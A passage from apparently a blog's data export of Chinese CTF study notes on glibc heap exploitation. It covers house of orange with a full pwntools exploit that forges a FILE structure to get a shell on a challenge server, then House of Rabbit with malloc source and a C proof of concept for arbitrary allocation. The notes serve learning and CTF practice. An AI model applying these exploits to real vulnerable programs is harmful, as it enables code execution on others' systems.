chunk，就可以通过这个手段来获取free chunk<br>使用条件：需要要堆溢出漏洞，可以修改top chunk的size<br>利用原理：正常情况下（指绕过检查），如果申清的堆块大小大于top chunk大小，那么top chunk就会被放进unsorted bin中。然后重新映射或扩展一个新的top chunk。<br>绕过检查：1.top chunk 的size 必须大于MINSIZE ，且小于我们申请的堆块大小。2.top chunk 的pre_inuse 必须为“1”。3.top chunk 的size + top chunk 的addr 必须页对齐(最后3为是0x00)。4.我们申请的堆块必须小于0x2000</p>\n<h2 id=\"unsorted-bin-attack-FSOP-简介\"><a href=\"#unsorted-bin-attack-FSOP-简介\" class=\"headerlink\" title=\"unsorted bin attack &amp; FSOP 简介\"></a>unsorted bin attack &amp; FSOP 简介</h2><h3 id=\"unsorted-bin-attack\"><a href=\"#unsorted-bin-attack\" class=\"headerlink\" title=\"unsorted bin attack\"></a>unsorted bin attack</h3><p>使用场景：一般是辅助其他攻击手段的，本身这个手法并没有什么大作用<br>使用条件：堆溢出或者uaf，可以编辑unsorted bin 中链尾的 bk<br>使用原理：修改unsorted bin链尾bk，可以往bk中写入main_arena+88的地址<br>注意事项：在此之后，无法再从unsorted bin中申请堆块</p>\n<h3 id=\"FSOP\"><a href=\"#FSOP\" class=\"headerlink\" title=\"FSOP\"></a>FSOP</h3><p>篡改__IO_list_all 和 _chain，来劫持IO_FILE.然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow.<br>1.在这样的一个利用链里，前面的步骤让我们在__IO_list_all 的表头写入了main_arena+88 。破坏了这个结构体的结构。此时chain字段的内容被修改为main_arena 中 smallbin chunk 的地址。<br>2.所以，下一个结构体就会是，我们的small bin 的chunk。此时控制这个chunk 的内容，就能控制__IO_list_all ，按照要求部署结构。再下一次malloc 时，就可以触发。<br>3.这里需要注意，__IO_list_all 这个结构是变化的，首先在溢出修改完时，这个的结构是，头在main_arena+88 的位置.此时的chain 指向small bin chunk.所以下一次,表头就是,这个chunk 的头部，里面的字段也会是对应的内容。我们需要控制的flag字段，vtable字段，还有中间的相关字段</p>\n<h2 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h2><h3 id=\"houseoforange-hitcon-2016\"><a href=\"#houseoforange-hitcon-2016\" class=\"headerlink\" title=\"houseoforange_hitcon_2016\"></a>houseoforange_hitcon_2016</h3><p>分析一下exp吧，具体的一个流程有时间再补充一下。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224440703.png\" alt=\"image-20250526224440703\"><br>1.这一段主要是在泄露libc。先正常添加一个堆块，然后利用溢出去修该top chunk 的size 为0xfa1，紧接着申清大堆块完成house of orange的利用。<br>2.然后的add,是为了把libc泄露出来，因为本题没有uaf，所以只能这样。把fd覆盖后，接受bk。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224818280.png\" alt=\"image-20250526224818280\"><br>1.这里还是泄露为主，泄露堆地址，这个是题目本身会在申请的堆块里写入地址。同时没有<code>&quot;\\x00&quot;</code>覆盖，导致后续的泄露。这里把上一个堆块的fd 和 bk 位置都填充满，去泄露下面的信息。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526225200971.png\" alt=\"image-20250526225200971\"><br>1.这段时unsorted bin attack 和 FSOP 一起的，似乎这个必须一起，不能分开。第五行就是对之前unsorter bin 中chunk bk 的复写。<br>2.同时，这个位置也是伪造的small bin。也是后续的第二个FILE 的结构体。<br>3.感觉其实应该也不是只能这么写吧，这个应该是所需字节数最少的写法，后续可以尝试把两个分开写写看能不能成功.<br>4.现在验证了，这个偏移是不能乱填的，因为必须把原先的堆块的size 覆盖掉，不能随便伪造其他堆块。</p>\n<h4 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">arch=<span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">ip=<span class=\"string\">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">29775</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;houseoforange_hitcon_2016&quot;</span>,ip,port)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Your choice : &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Length of name :&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;Name :&quot;</span>,content)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Price of Orange&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Color of Orange&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Your choice : &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Length of name :&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;Name:&quot;</span>,content)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Price of Orange&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Color of Orange&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;Your choice : &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x18</span>+p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">0x0000002000000001</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(<span class=\"number\">0xfa1</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x1000</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x400</span>,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">io.recv(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">leak=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libcbase=leak-<span class=\"number\">0x3c5188</span></span><br><span class=\"line\"></span><br><span class=\"line\">io_list_all=libcbase+libc.symbols[<span class=\"string\">&#x27;_IO_list_all&#x27;</span>]</span><br><span class=\"line\">sys_addr=libcbase+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">edit(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;e&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;e&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">leak_heap=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">logvalue(<span class=\"string\">&#x27;leak_heap&#x27;</span>,<span class=\"built_in\">hex</span>(leak_heap))</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;f&#x27;</span>*<span class=\"number\">0x400</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload+=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>+p64(<span class=\"number\">0x61</span>) <span class=\"comment\">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(io_list_all-<span class=\"number\">0x10</span>) <span class=\"comment\">#old top chunk fd &amp; bk</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)<span class=\"comment\">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">7</span></span><br><span class=\"line\">payload+=p64(leak_heap+<span class=\"number\">0x430</span>)<span class=\"comment\">#chain</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">13</span></span><br><span class=\"line\">payload+=p64(leak_heap+<span class=\"number\">0x508</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(sys_addr)</span><br><span class=\"line\">edit(<span class=\"number\">0x1000</span>,payload)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"参考博客\"><a href=\"#参考博客\" class=\"headerlink\" title=\"参考博客\"></a>参考博客</h2><p><a href=\"https://www.cnblogs.com/ZIKH26/articles/16712469.html\">关于house of orange(unsorted bin attack &amp;&amp;FSOP)的学习总结 - ZikH26 - 博客园</a></p>\n"},{"title":"House of Rabbit","cover":"/img/达令.png","_content":"# House of Rabbit\n\n## 前言\n​哎呀，也不知道怎么说，看CTFshow上的poc总有一种无力感，啥玩意也没有。那个注释吧，也就是把how2heap的注释翻译了一下吧。真感觉他自己过个几年回来看自己的poc，估计也不知道是怎么利用吧。反正感觉写得莫名其妙，描述的语言逻辑不清楚。好在看雪上有一篇精华帖，写得很好，讲到了关键点。\n​现在就是自己重新分析，改一下他的poc吧。\n\n## 相关源码\n**文件路径(malloc/malloc.c)**\n\n### malloc_consolidate\n\n```c\nstatic void malloc_consolidate(mstate av)\n{\n  mfastbinptr*    fb;                 /* current fastbin being consolidated */\n  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */\n  mchunkptr       p;                  /* current chunk being consolidated */\n  mchunkptr       nextp;              /* next chunk to consolidate */\n  mchunkptr       unsorted_bin;       /* bin header */\n  mchunkptr       first_unsorted;     /* chunk to link to */\n\n  /* These have same use as in free() */\n  mchunkptr       nextchunk;\n  INTERNAL_SIZE_T size;\n  INTERNAL_SIZE_T nextsize;\n  INTERNAL_SIZE_T prevsize;\n  int             nextinuse;\n  mchunkptr       bck;\n  mchunkptr       fwd;\n\n  /*\n    If max_fast is 0, we know that av hasn't\n    yet been initialized, in which case do so below\n  */\n\n  if (get_max_fast () != 0) {\n    clear_fastchunks(av);\n\n    unsorted_bin = unsorted_chunks(av);\n\n    /*\n      Remove each chunk from fast bin and consolidate it, placing it\n      then in unsorted bin. Among other reasons for doing this,\n      placing in unsorted bin avoids needing to calculate actual bins\n      until malloc is sure that chunks aren't immediately going to be\n      reused anyway.\n    */\n\n    maxfb = &fastbin (av, NFASTBINS - 1);\n    fb = &fastbin (av, 0);\n    do {\n      p = atomic_exchange_acq (fb, 0);\n      if (p != 0) {\n\tdo {\n\t  check_inuse_chunk(av, p);\n\t  nextp = p->fd;\n\n\t  /* Slightly streamlined version of consolidation code in free() */\n\t  size = p->size & ~(PREV_INUSE|NON_MAIN_ARENA);\n\t  nextchunk = chunk_at_offset(p, size);\n\t  nextsize = chunksize(nextchunk);\n\n\t  if (!prev_inuse(p)) {\n\t    prevsize = p->prev_size;\n\t    size += prevsize;\n\t    p = chunk_at_offset(p, -((long) prevsize));\n\t    unlink(av, p, bck, fwd);\n\t  }\n\n\t  if (nextchunk != av->top) {\n\t    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n\n\t    if (!nextinuse) {\n\t      size += nextsize;\n\t      unlink(av, nextchunk, bck, fwd);\n\t    } else\n\t      clear_inuse_bit_at_offset(nextchunk, 0);\n\n\t    first_unsorted = unsorted_bin->fd;\n\t    unsorted_bin->fd = p;\n\t    first_unsorted->bk = p;\n\n\t    if (!in_smallbin_range (size)) {\n\t      p->fd_nextsize = NULL;\n\t      p->bk_nextsize = NULL;\n\t    }\n\n\t    set_head(p, size | PREV_INUSE);\n\t    p->bk = unsorted_bin;\n\t    p->fd = first_unsorted;\n\t    set_foot(p, size);\n\t  }\n\n\t  else {\n\t    size += nextsize;\n\t    set_head(p, size | PREV_INUSE);\n\t    av->top = p;\n\t  }\n\n\t} while ( (p = nextp) != 0);\n\n      }\n    } while (fb++ != maxfb);\n  }\n  else {\n    malloc_init_state(av);\n    check_malloc_state(av);\n  }\n}\n```\n1. 判断是否初始化.若未初始化，则初始化.\n2. 将fastbins清空。遍历fastbins.\n    - 向后合并(低地址),能合就合\n    - 向前合并(高地址),能合就合\n3. 如果合并后与topchunk相邻则合并入topchunk.\n4. 否则插入到unsortedbin 前面.\n\n## 相关调用\n1. `_int_malloc()`中调用\n    - 申请large chunk 时，且arena 存在fastbins chunk 触发\n    - 申请small chunk时，victim==0时触发(错误处理)\n2. `mtrim()`中调用\n3. `__libc_mallopt()`中调用\n4. `_int_free`中调用\n    - 释放到unsortedbin进行consolidation的过程中，在向前向后合并完成了以后，如果合并后大小大于0xffff，就检测fastbin chunk并进行合并\n\n## 利用思路和条件\n### 思路(感觉更像流程)\n1. 申请大堆块，增加av->system_mem和触发grow_heap . 使heap空间初始化与.bss等段空间相邻 .\n2. 在想要分配的地址(设为target)附近伪造fake chunk(设为buf)，然后申请一个fastbins(设为a)大小的  ，一个smallbin(设为b)大小的chunk。\n3. 先将a 放入fastbins 中，通过溢出或者uaf 漏洞，将buf链入fastbins 中。通过free掉b，触发malloc_consodilate,把 fastbins清空且插入unsorted bin。**因为a和b相邻所以都被合并到topchunk，而buf不相邻，所以会无法合并，而被插入到unsortedbin 中。**\n4. 再次通过申请大堆块，把unosorted bin 放入large bin 中。当然，为了能成功的进入large bin，我们需要先修改buf的size在合理的范围。\n5. 最后继续修改buf的size为0xfffffffffffffff1，再计算与target的偏移，申请偏移大小的堆块后，即可分配到target。\n### 个人理解\n1. 感觉关键在于第三步触发malloc_consodilate时，可以有一个把任意地址链入unsorted bin的机会。利用这个可以后续完成任意地址的分配。\n2. 但是感觉前面的准备工作很多，第三步之后的部分和house of force 后续的手法差不多。一个是通过topchunk 与 target 的偏移；一个是利用large chunk 与 target 的偏移。\n3. 如果按照上述流程的话，一开始就要申请两次大堆块。感觉有点明显（出题的话）。\n4. 后续对fastbins chunk 合并时增加了检查，使得利用更加得困难。\n### 条件\n1. 首先就是对堆块的申请大小没有限制。在这个过程中，我们申请了极大的堆块，同时也有最小的堆块，如果堆块的大小被限制的话就很难搞。\n2. 存在溢出漏洞，或者uaf。允许我们可以修改处于空闲状态的堆块的fd指针和size。\n3. 中间不能有不能free的堆块。如果有自动申请的堆块，而且还不会被free，可能会卡我们位置。导致第三步的时候出现问题。（但感觉，有1,2 两点的话，应该也可以绕过。感觉加上这个应该会很好玩）。\n\n## demo\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <malloc.h>\n\nchar target[20]=\"hello world\";\nuint64_t  buf[20];\nint main(){\n    setbuf(stdin,NULL);\n\tsetbuf(stdout,NULL);\n\n    size_t* a;\n    uint8_t* b;\n    uint8_t* c;\n    char* d;\n    /*申请两次大堆块，并free*/\n    a=malloc(0xa00000);\n    printf(\"\\033[1;33m第一步申请一个大堆块然后free，使system->mem提升:\\033[0m\\n\");\n    printf(\"第一次申请a，a的地址：%p\\n\",a-2);\n    free(a);\n    \n    a=malloc(0xa00000);\n    printf(\"\\033[1;33m第二次继续申请一个大堆块，然后free，触发heap_grow:\\033[0m\\n\");\n    printf(\"第二次申请a，a的地址：%p\\n\\n\",a-2);\n    free(a);\n\n\n    /*申请两个堆块，一个fastbins大小 ，一个smallbin大小*/\n    printf(\"\\033[1;33m此时申请一个fast chunk，一个small chunk为后续利用作铺垫:\\033[0m\\n\");\n    a=malloc(0x10);\n    b=malloc(0x80);\n    printf(\"fast chunk a: %p\\n\",a-2);\n    printf(\"small chunk b: %p\\n\\n\",b-0x10);\n    \n    /*\n    用来链入large bin的fake chunk,注意从buf[1]~buf[5]是我们的fake chunk\n    buf[0]是为了绕过_int_malloc中的检测，\n    buf[7]是为了绕过_int_free时调用的consolidate的检测。\n    */\n    buf[0]=0xfffffffffffffff0;/*在检测中会用size+buf[2] 与size 比较，结果为0才能正确绕过*/\n    buf[1]=0x0;\n    buf[2]=0;\n    buf[3]=0x21;\n    buf[4]=0;\n    buf[5]=0;\n    buf[6]=0;\n    buf[7]=1;  /*绕过malloc_consolidate 中的unlink操作*/\n    printf(\"\\033[1;33m伪造一个fake chunk，并为绕过一些检测，在某些地方埋伏笔\\033[0m\\n\");\n    printf(\"这是fake chunk--buf[2]的地址: %p\\n\",buf+2);\n    printf(\"这是目标target的地址: %p\\n\",target);\n    printf(\"\\033[1;33m为了绕过检测而提前作的准备:\\033[0m;\\n\");\n    printf(\"buf[2]-0x10: %#lx\\n\",buf[0]);\n    printf(\"buf[2]+0x28: %#lx\\n\",buf[7]);\n    printf(\"buf[2]的size: %#lx\\n\\n\",buf[3]);\n\n    /*把a 放入fastbins ,把buf链入fastbin*/\n    printf(\"\\033[1;33m先free a,在通过修改a的fd，把buf[2]链入，随后free b触发:\\033[0m\\n\");\n    free(a);\n    *a=(size_t)(&buf[2]);\n    /*触发malloc_consolidate*/\n    free(b);\n\n    /*申请大堆块把buf放进largebin，修改buf size*/\n    printf(\"\\033[1;33m先修改buf 的size，使其可以被放入large bin中:\\033[0m\\n\");\n    buf[3]=0xa00001;\n    b=malloc(0xa00000);\n    printf(\"buf[2]的size: %#lx\\n\\n\",buf[3]);\n    /*再次修改size*/\n    printf(\"\\033[1;33m把buf 的size 修改为很大，使得可以分配到我们的target：\\033[0m\\n\");\n    buf[3]=0xfffffffffffffff1;\n    /**/\n    c=malloc(0xffffffffffffff80);\n    d=malloc(0x10);\n    printf(\"分配到的d:%p\\n\",d);\n    printf(\"target: %p\\n\",target);\n    return 0;\n}\n```\n## 为什么fakechunk 后要设置1？\n```c\nif (!nextinuse) {\n\t      size += nextsize;\n\t      unlink(av, nextchunk, bck, fwd);\n\t    } else\n\t      clear_inuse_bit_at_offset(nextchunk, 0);\n```\n1. 这是因为后续free(b) ，触发malloc_consolidate,时会检测nextinuse。如果是0就会触发unlink，而我们的利用是不能走这条路的，所以为了绕过，就需要把nextinuse置1.\n2. 同时因为这个绕过在前，所以我们先将fakechunk 的size设置为很小的0x20，这样置1的位置也很近，更方便。\n3. 在检测中是nextinuse，因为我们的size为0。通过buf[6]+0，得到的还是buf[6]自己,所以只需要在这里置1就ok了.\n## 为什么fakechunk前要置0xfffffffffffffff0？\n\n![_int_malloc中的检测](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/d7c462933cf8847287b123a9d1dc54f5.png)\n\n1. 在后续malloc(c)是，也就将largebin 迁移到target的调用中，有检测。就是[buf+size] -size，当这个结果为0 时，才能正常进行。\n2. 因为我们将size设置为了0xfffffffffffffff0，所以[buf+size]要等于0xfffffffffffffff0。那么[buf+size]又是何处呢？\n3. 其实就是buf-0x10。图中的r15，就是我们之前链入fastbins 的地址。\n\n## 关键部分演示\n\n### 把buf链入fastbins\n\n![buf入fastbins](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630032850548.png)\n\n### free b触发malloc_consolidate\n\n![触发malloc_consolidate](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033107787.png)\n### 把buf放入largebin\n\n![image-20250630033400440](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033400440.png)\n因为大小不够，所以会被放入large bin\n\n### malloc，迁移largebins\n\n![image-20250630033528949](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033528949.png)\n1. 这次大小足够了可以分配\n2. 这个偏移计算是$[（target-0x10）-buf]-0x10$\n\n### 分配target\n\n![image-20250630034203589](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630034203589.png)\n下一步就可以分配到target了","source":"_posts/heap/House of Rabbit.md","raw":"---\ntitle: House of Rabbit\ntags:\n    - pwn\n    - House of XXX\ncategories:\n    - 学习笔记\ncover: /img/达令.png\n---\n# House of Rabbit\n\n## 前言\n​哎呀，也不知道怎么说，看CTFshow上的poc总有一种无力感，啥玩意也没有。那个注释吧，也就是把how2heap的注释翻译了一下吧。真感觉他自己过个几年回来看自己的poc，估计也不知道是怎么利用吧。反正感觉写得莫名其妙，描述的语言逻辑不清楚。好在看雪上有一篇精华帖，写得很好，讲到了关键点。\n​现在就是自己重新分析，改一下他的poc吧。\n\n## 相关源码\n**文件路径(malloc/malloc.c)**\n\n### malloc_consolidate\n\n```c\nstatic void malloc_consolidate(mstate av)\n{\n  mfastbinptr*    fb;                 /* current fastbin being consolidated */\n  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */\n  mchunkptr       p;                  /* current chunk being consolidated */\n  mchunkptr       nextp;              /* next chunk to consolidate */\n  mchunkptr       unsorted_bin;       /* bin header */\n  mchunkptr       first_unsorted;     /* chunk to link to */\n\n  /* These have same use as in free() */\n  mchunkptr       nextchunk;\n  INTERNAL_SIZE_T size;\n  INTERNAL_SIZE_T nextsize;\n  INTERNAL_SIZE_T prevsize;\n  int             nextinuse;\n  mchunkptr       bck;\n  mchunkptr       fwd;\n\n  /*\n    If max_fast is 0, we know that av hasn't\n    yet been initialized, in which case do so below\n  */\n\n  if (get_max_fast () != 0) {\n    clear_fastchunks(av);\n\n    unsorted_bin = unsorted_chunks(av);\n\n    /*\n      Remove each chunk from fast bin and consolidate it, placing it\n      then in unsorted bin. Among other reasons for doing this,\n      placing in unsorted bin avoids needing to calculate actual bins\n      until malloc is sure that chunks aren't immediately going to be\n      reused anyway.\n    */\n\n    maxfb = &fastbin (av, NFASTBINS - 1);\n    fb = &fastbin (av, 0);\n    do {\n      p = atomic_exchange_acq (fb, 0);\n      if (p != 0) {\n\tdo {\n\t  check_inuse_chunk(av, p);\n\t  nextp = p->fd;\n\n\t  /* Slightly streamlined version of consolidation code in free() */\n\t  size = p->size & ~(PREV_INUSE|NON_MAIN_ARENA);\n\t  nextchunk = chunk_at_offset(p, size);\n\t  nextsize = chunksize(nextchunk);\n\n\t  if (!prev_inuse(p)) {\n\t    prevsize = p->prev_size;\n\t    size += prevsize;\n\t    p = chunk_at_offset(p, -((long) prevsize));\n\t    unlink(av, p, bck, fwd);\n\t  }\n\n\t  if (nextchunk != av->top) {\n\t    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n\n\t    if (!nextinuse) {\n\t      size += nextsize;\n\t      unlink(av, nextchunk, bck, fwd);\n\t    } else\n\t      clear_inuse_bit_at_offset(nextchunk, 0);\n\n\t    first_unsorted = unsorted_bin->fd;\n\t    unsorted_bin->fd = p;\n\t    first_unsorted->bk = p;\n\n\t    if (!in_smallbin_range (size)) {\n\t      p->fd_nextsize = NULL;\n\t      p->bk_nextsize = NULL;\n\t    }\n\n\t    set_head(p, size | PREV_INUSE);\n\t    p->bk = unsorted_bin;\n\t    p->fd = first_unsorted;\n\t    set_foot(p, size);\n\t  }\n\n\t  else {\n\t    size += nextsize;\n\t    set_head(p, size | PREV_INUSE);\n\t    av->top = p;\n\t  }\n\n\t} while ( (p = nextp) != 0);\n\n      }\n    } while (fb++ != maxfb);\n  }\n  else {\n    malloc_init_state(av);\n    check_malloc_state(av);\n  }\n}\n```\n1. 判断是否初始化.若未初始化，则初始化.\n2. 将fastbins清空。遍历fastbins.\n    - 向后合并(低地址),能合就合\n    - 向前合并(高地址),能合就合\n3. 如果合并后与topchunk相邻则合并入topchunk.\n4. 否则插入到unsortedbin 前面.\n\n## 相关调用\n1. `_int_malloc()`中调用\n    - 申请large chunk 时，且arena 存在fastbins chunk 触发\n    - 申请small chunk时，victim==0时触发(错误处理)\n2. `mtrim()`中调用\n3. `__libc_mallopt()`中调用\n4. `_int_free`中调用\n    - 释放到unsortedbin进行consolidation的过程中，在向前向后合并完成了以后，如果合并后大小大于0xffff，就检测fastbin chunk并进行合并\n\n## 利用思路和条件\n### 思路(感觉更像流程)\n1. 申请大堆块，增加av->system_mem和触发grow_heap . 使heap空间初始化与.bss等段空间相邻 .\n2. 在想要分配的地址(设为target)附近伪造fake chunk(设为buf)，然后申请一个fastbins(设为a)大小的  ，一个smallbin(设为b)大小的chunk。\n3. 先将a 放入fastbins 中，通过溢出或者uaf 漏洞，将buf链入fastbins 中。通过free掉b，触发malloc_consodilate,把 fastbins清空且插入unsorted bin。**因为a和b相邻所以都被合并到topchunk，而buf不相邻，所以会无法合并，而被插入到unsortedbin 中。**\n4. 再次通过申请大堆块，把unosorted bin 放入large bin 中。当然，为了能成功的进入large bin，我们需要先修改buf的size在合理的范围。\n5. 最后继续修改buf的size为0xfffffffffffffff1，再计算与target的偏移，申请偏移大小的堆块后，即可分配到target。\n### 个人理解\n1. 感觉关键在于第三步触发malloc_consodilate时，可以有一个把任意地址链入unsorted bin的机会。利用这个可以后续完成任意地址的分配。\n2. 但是感觉前面的准备工作很多，第三步之后的部分和house of force 后续的手法差不多。一个是通过topchunk 与 target 的偏移；一个是利用large chunk 与 target 的偏移。\n3. 如果按照上述流程的话，一开始就要申请两次大堆块。感觉有点明显（出题的话）。\n4. 后续对fastbins chunk 合并时增加了检查，使得利用更加得困难。\n### 条件\n1. 首先就是对堆块的申请大小没有限制。在这个过程中，我们申请了极大的堆块，同时也有最小的堆块，如果堆块的大小被限制的话就很难搞。\n2. 存在溢出漏洞，或者uaf。允许我们可以修改处于空闲状态的堆块的fd指针和size。\n3. 中间不能有不能free的堆块。如果有自动申请的堆块，而且还不会被free，可能会卡我们位置。导致第三步的时候出现问题。（但感觉，有1,2 两点的话，应该也可以绕过。感觉加上这个应该会很好玩）。\n\n## demo\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <malloc.h>\n\nchar target[20]=\"hello world\";\nuint64_t  buf[20];\nint main(){\n    setbuf(stdin,NULL);\n\tsetbuf(stdout,NULL);\n\n    size_t* a;\n    uint8_t* b;\n    uint8_t* c;\n    char* d;\n    /*申请两次大堆块，并free*/\n    a=malloc(0xa00000);\n    printf(\"\\033[1;33m第一步申请一个大堆块然后free，使system->mem提升:\\033[0m\\n\");\n    printf(\"第一次申请a，a的地址：%p\\n\",a-2);\n    free(a);\n    \n    a=malloc(0xa00000);\n    